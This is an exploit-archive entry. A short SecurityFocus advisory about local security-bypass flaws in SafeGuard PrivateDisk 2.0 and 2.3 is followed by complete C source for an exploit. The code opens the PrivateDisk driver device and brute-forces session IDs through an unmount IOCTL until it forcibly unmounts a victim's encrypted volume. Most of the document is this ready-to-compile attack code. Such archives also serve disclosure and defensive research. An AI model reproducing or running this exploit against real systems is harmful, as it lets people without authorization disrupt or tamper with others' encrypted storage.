source: http://www.securityfocus.com/bid/45749/info

SafeGuard PrivateDisk is prone to multiple local security-bypass vulnerabilities.

Attackers with physical access to a computer with the affected application installed can exploit these issues to bypass certain security restrictions and perform unauthorized actions.

SafeGuard PrivateDisk 2.0 and 2.3 are vulnerable; other versions may also be affected. 

/* safeguard-pdisk-unmount.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * Utimaco Safeware AG (Sophos) - SafeGuard PrivateDisk unmount exploit
 * by mu-b - Wed 05 Mar 2008
 *
 * - Tested on: privatediskm.sys 2.2.0.16
 *                (<= Utimaco Safeware AG (Sophos) - SafeGuard PrivateDisk 2.0)
 *              privatediskm.sys
 *                (<= Sophos - SafeGuard PrivateDisk 2.3)
 *
 * This exploit 'tunnels' an ioctl request to the mounted volume device
 * for the volume file given in the argument, the request will forcibly
 * unmount the device.
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <ddk/ntapi.h>

#define SGPD_UNMOUNT_IOCTL      0x0007200C
#define SGPD_MAX_SESSION_ID     0xFFFFF

struct ioctl_req {
  int  session_id;
  char volume_buf[0x200];
};

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  DWORD i, j, rlen;
  CHAR buf[0x100];
  HANDLE hFile;
  BOOL result;

  printf ("Utimaco Safeware AG - SafeGuard PrivateDisk unmount exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <volume file>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  hFile = CreateFileA ("\\\\.\\PrivateDisk", GENERIC_READ,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  memset (buf, 0, sizeof buf);
  strncpy (buf, argv[1], sizeof buf - 1);

  for (i = 0, j = 0; i < sizeof req.volume_buf - 4; i += 2, j++)
    {
      req.volume_buf[i] = buf[j];
      req.volume_buf[i+1] = 0x00;
    }

  for (i = 0; i < SGPD_MAX_SESSION_ID; i++)
    {
      req.session_id = i;

      result = DeviceIoControl (hFile, SGPD_UNMOUNT_IOCTL,
                                &req, sizeof req,
                                &req, sizeof req, &rlen, 0);
      if (result)
        {
          printf ("* found, session_id: %d, volume name: %s", i, buf);
          break;
        }

      if (!(i % 64))
        {
          printf ("* trying session_id: %d\r", i);
        }
    }
  printf ("\n* done\n");

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}